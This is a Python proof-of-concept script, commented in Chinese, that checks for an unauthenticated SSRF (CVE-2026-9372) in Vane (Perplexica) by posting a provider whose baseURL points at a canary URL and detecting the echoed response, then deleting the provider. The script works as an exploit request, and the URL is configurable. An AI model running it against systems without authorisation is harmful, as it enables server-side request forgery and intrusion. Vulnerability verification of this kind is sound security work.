# -*- coding: utf-8 -*-
"""
Vane (Perplexica) <= 1.12.1 / CVE-2026-9372 — 未授权 SSRF 无害验证脚本
用法:
    TARGET=http://<host>:<port> python verify_vane_ssrf.py
    # 走 Burp:
    USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080 TARGET=http://<host>:<port> python verify_vane_ssrf.py
说明:
    - 仅向目标自带接口 POST 一次,验证 baseURL 可控且响应被回显(以 example.com 为外部canary)。
    - 不内置任何内网/元数据地址;不做端口扫描、不做写利用、不武器化。
    - 验证完成后自动 DELETE 创建的 provider,清理测试数据。
    - 仅用于授权测试与漏洞验证。
"""
import os
import sys
import json
import requests
import urllib3

urllib3.disable_warnings()

TARGET = os.environ.get("TARGET", "{{TARGET}}")
USE_BURP = os.environ.get("USE_BURP", "1") == "1"
BURP_PROXY = os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")
CANARY = os.environ.get("CANARY_URL", "http://www.example.com")

PROXIES = {"http": BURP_PROXY, "https": BURP_PROXY} if USE_BURP else None

if TARGET.startswith("{{"):
    sys.exit("[!] 请设置 TARGET 环境变量,如 TARGET=http://127.0.0.1:3000")

base = TARGET.rstrip("/")
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})

print(f"[>] target: {base} (burp={USE_BURP})")

payload = {"type": "ollama", "name": "cnvd-verify",
           "config": {"baseURL": CANARY}}

r = s.post(base + "/api/providers", data=json.dumps(payload),
           proxies=PROXIES, verify=False, timeout=25)
print(f"[<] {r.status_code}")
body = r.text
print(f"    {body[:300]}")

provider_id = None
try:
    provider_id = r.json()["provider"]["id"]
except Exception:
    pass

if r.status_code == 200 and "Unexpected token" in body and ("doctype" in body or "DOCTYPE" in body):
    print("[+] SSRF CONFIRMED: 服务端发起对外请求,响应内容被回显")
    print(f"    chatModels[0].name 含目标响应片段 -> CWE-918 / CVE-2026-9372")
else:
    print("[-] 未复现:目标可能已修复、版本不受影响或路径不可达")

if provider_id:
    d = s.delete(f"{base}/api/providers/{provider_id}",
                 proxies=PROXIES, verify=False, timeout=15)
    print(f"[*] cleanup: DELETE provider -> {d.status_code} {d.text[:60]}")
else:
    print("[!] 未取到 provider id,请手动检查是否产生残留数据")
